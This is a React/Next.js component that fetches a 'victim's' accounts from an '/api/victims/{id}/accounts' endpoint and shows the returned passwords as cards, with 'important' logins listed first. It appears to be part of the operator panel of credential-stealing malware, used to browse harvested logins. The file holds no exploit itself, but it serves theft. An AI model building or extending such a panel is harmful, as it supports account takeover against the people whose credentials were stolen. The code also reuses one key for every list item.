import type { IPassword } from '@/interfaces';
import { AnimationContainer, Account, AccountSkeleton, Password } from '@/components';
import { fetcher } from '@/lib';
import { useRouter } from 'next/router';
import { useId } from 'react';
import useSWR from 'swr';

export const Accounts = () => {
  const router = useRouter();
  const { data, error } = useSWR(`/api/victims/${router.query.id}/accounts`, fetcher);
  const passwords: IPassword[] | null = data ? data : null;
  const id = useId();

  return (
    <>
      <div className="px-3">
        <div className="py-3 grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-[1rem] lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
          {!passwords || !passwords.length || error ? (
            <>
              {Array.from({ length: 3 }).map(() => (
                <AccountSkeleton key={id} />
              ))}
            </>
          ) : (
            passwords
              .filter(({ important }) => important)
              .map((data: IPassword) => (
                <AnimationContainer key={id}>
                  <Account {...data} />
                </AnimationContainer>
              ))
          )}
        </div>
        <div className="py-3 grid grid-cols-1 sm:grid-cols-3 md:grid-cols-3 base:grid-cols-3 gap-[1rem] lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
          {passwords &&
            passwords
              .filter(({ important }) => !important)
              .map((data: IPassword) => (
                <AnimationContainer key={id}>
                  <Password {...data} />
                </AnimationContainer>
              ))}
        </div>
      </div>
    </>
  );
};
